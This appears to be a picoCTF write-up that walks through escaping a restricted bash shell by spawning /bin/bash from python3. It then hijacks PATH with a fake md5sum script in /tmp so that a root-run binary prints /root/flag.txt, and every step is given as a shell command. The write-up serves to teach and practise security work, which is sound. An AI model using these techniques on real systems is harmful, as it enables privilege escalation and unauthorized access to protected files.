# Co-author of System Binaries

**Platform:** picoCTF  
**Technique:** PATH Hijack + Restricted Shell Escape  
**Difficulty:** Easy-Medium  

## Challenge Description

A binary (`flaghasher`) calls `md5sum` to compute the hash of `/root/flag.txt`. The challenge starts in a restricted shell (`rbash`) that blocks many commands. We need to escape the restricted shell, then hijack the `PATH` to make the binary run our own `md5sum` script.

## Vulnerability

Two vulnerabilities combine here:
1. **Restricted shell** (`rbash`) — can be escaped by spawning a real shell
2. **PATH hijacking** — the binary calls `md5sum` without a full path, so we can replace it

## Exploitation

### Step 1: Attempt a Simple Alias (Fails)

```bash
alias md5sum='cat /root/flag.txt'
flaghasher
```
This prints a hash, not the flag — the alias doesn't affect the binary's execution.

Step 2: Escape the Restricted Shell
rbash blocks cd, vi, etc., but allows python3:

```bash
python3 -c 'import os; os.system("/bin/bash")'
```
This spawns a full bash shell, escaping the restrictions.

Step 3: Create a Fake md5sum
```bash
cd /tmp
echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum
chmod +x md5sum
```
Step 4: Find the Target Binary
```bash
find / -name flaghasher 2>/dev/null
Output: /usr/local/bin/flaghasher
```

Step 5: Hijack PATH
```bash
PATH=/tmp:$PATH /usr/local/bin/flaghasher
```
PATH=/tmp:$PATH tells the system to look in /tmp first

The binary looks for md5sum → finds our fake script → executes it → prints the flag

Step 6: Get the Flag
The binary prints the flag directly.

